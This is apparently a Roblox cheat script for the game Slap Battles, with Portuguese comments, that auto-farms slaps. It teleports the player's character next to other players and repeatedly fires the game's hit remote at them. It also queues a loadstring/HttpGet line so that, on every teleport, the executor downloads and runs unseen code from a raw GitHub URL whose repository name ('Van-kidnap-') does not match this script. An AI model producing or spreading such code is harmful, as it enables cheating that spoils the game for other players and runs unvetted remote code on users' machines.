-- Auto Slap Battles Farm Script - Autoexec Ready

if not game:IsLoaded() then game.Loaded:Wait() end

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local TeleportService = game:GetService("TeleportService")
local HttpService = game:GetService("HttpService")
local LocalPlayer = Players.LocalPlayer

local FarmGoal = 200 -- Quantidade de slaps para farmar
local WaitBetweenSlaps = 0.3

local function GetGloveValue()
    local ls = LocalPlayer:FindFirstChild("leaderstats")
    if not ls then return "" end
    local glove = ls:FindFirstChild("Glove")
    if glove then
        return glove.Value
    end
    return ""
end

local function EquipGlove(name)
    if GetGloveValue() ~= name then
        local lobby = workspace:FindFirstChild("Lobby")
        if lobby and lobby:FindFirstChild(name) then
            local clickdetector = lobby[name]:FindFirstChildWhichIsA("ClickDetector")
            if clickdetector then
                fireclickdetector(clickdetector)
                task.wait(1)
            end
        end
    end
end

local function GetValidTarget()
    for _, plr in pairs(Players:GetPlayers()) do
        if plr ~= LocalPlayer and plr.Character and plr.Character:FindFirstChild("entered") and plr.Character.entered.Value == true and plr.Character:FindFirstChild("HumanoidRootPart") then
            local humanoid = plr.Character:FindFirstChildWhichIsA("Humanoid")
            if humanoid and humanoid.Health > 0 then
                return plr
            end
        end
    end
    return nil
end

local Remote = ReplicatedStorage:WaitForChild("SnowHit")

local function Farm()
    EquipGlove("Snow")
    local char = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
    local hrp = char:WaitForChild("HumanoidRootPart")
    while LocalPlayer.leaderstats.Slaps.Value < FarmGoal do
        local target = GetValidTarget()
        if target and target.Character then
            local root = target.Character:FindFirstChild("HumanoidRootPart")
            if root then
                hrp.CFrame = root.CFrame * CFrame.new(0, 0, -5)
                Remote:FireServer(root)
            end
        end
        task.wait(WaitBetweenSlaps)
    end
end

-- Auto queue_on_teleport para autoexec (suporta Synapse, KRNL, etc)
local function SetupAutoExec()
    local url = "https://raw.githubusercontent.com/lecheforlife/Van-kidnap-/main/script.lua"
    if queue_on_teleport then
        queue_on_teleport(string.format('loadstring(game:HttpGet("%s"))()', url))
    elseif syn and syn.queue_on_teleport then
        syn.queue_on_teleport(string.format('loadstring(game:HttpGet("%s"))()', url))
    elseif KRNL and KRNL.QueueOnTeleport then
        KRNL.QueueOnTeleport(string.format('loadstring(game:HttpGet("%s"))()', url))
    end
end

SetupAutoExec()
Farm()
